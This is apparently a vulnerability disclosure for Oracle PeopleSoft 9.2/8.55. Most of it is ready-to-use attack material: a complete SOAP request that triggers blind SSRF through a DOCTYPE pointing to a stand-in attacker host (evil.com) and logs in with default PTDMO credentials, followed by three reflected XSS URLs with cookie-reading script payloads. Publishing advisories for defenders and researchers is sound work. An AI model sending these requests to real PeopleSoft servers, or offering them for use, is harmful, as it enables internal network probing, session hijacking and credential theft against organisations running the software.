
# Unauthenticated Blind SSRF in Oracle PeopleSoft Ingegration Gateway

Product: Oracle PeopleSoft
Version: 9.2/8.55

Similarly to CVE-2018-3167, Integration Gateway service is vulnerable to Server-Side Request Forgery.
Through a crafted SOAP pessage containing <!DOCTYPE> declaration an attacker is able to initiate HTTP and FTP requests to remote service. Response of each request is not sent back to the attacker, but successful and failed queries can be determined by timing of HTTP response.

### REQ:  
```
POST /PSIGW/PeopleSoftServiceListeningConnector?Operation=OperationName&OperationType=sync&From=RequestingNode&OrigNode=OrigNode&OrigProcess=OrigProcess&OrigTimeStamp=OrigTimeStamp&FinalDestination=FinalDestination&To=DestinationNode&SubQueue=SubQueue&NonRepudiation=Y&MessageVersion=MessageVersion HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
SOAPAction: xx
Content-Type: text/xml; action=xx
Content-Length: 1173

<?xml version="1.0"?><!DOCTYPE aaa PUBLIC "-//B/A/EN" "http://evil.com:7001/test?param=1">
<soapenv:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://schemas.xmlsoap.org/ws/2003/03/addressing/" xmlns:xsd="http://www.w3.org/2001/XMLSchema/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance/">
  <soapenv:Header xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <wsse:Security soap:mustUnderstand="1" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken wsu:Id="UsernameToken-1" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
        <wsse:Username>PTDMO</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">PTDMO</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"/>
</soapenv:Envelope>

```

# Reflected Cross-Site Scripting

Product: Oracle PeopleSoft
Version: 9.2/8.55

Due to insufficien input validation, PeopleSoft application is prone to multiple Cross-Site Scripting vulnerabilities.
This allows attacker for multiple client side attack scenarios, i.e. session hijacking or credential theft.

### 1. Reflected XSS in WEBLIB_PPM.ISCRIPT1

```
https://example.com/psc/[PSAPP]/EMPLOYEE/HRMS/s/WEBLIB_PPM.ISCRIPT1.FieldFormula.IScript_Main?PPMHCOMMAND=1;%0Aalert(document.cookie);
```

### 2. Reflected XSS in HRCD_CO_DIRECTORY.GBL

```
https://example.com/psc/[PSAPP]/EMPLOYEE/HRMS/c/ROLE_EMPLOYEE.HRCD_CO_DIRECTORY.GBL?pt_fname=11111111XXX000000000&IsFolder=true&TREE_SETID=&TREE_USERKEY=&TREE_NAME=COMPANY_DIRECTORY&TREE_EFFDT=2019-05-19&abnnode=11111111XXX000000000&TREE_BRANCH=&DISPL_PARENT=1&INITIAL_TREE_NODE=11111111XXX000000000&abnds=t&isleaf=false&abnpcode=WEBLIB_HRCD.ISCRIPT1.FieldFormula.IScript_setFolderFromTree&dynfid=CDOV:::&dynflbl="><script>alert(document.cookie)</script>&DataPath=&PortalPath=&hrcdrefocus=true&hrcdtablvl1=ORGCHART&hrcdparent=
```
### 3. Reflected Cross-Site Scripting in psc URL

```
https://example.com/psc/[PSAPP]/xss/x/c/x.%27%3E%3Cbutton%3ECLICK%3C!--
```
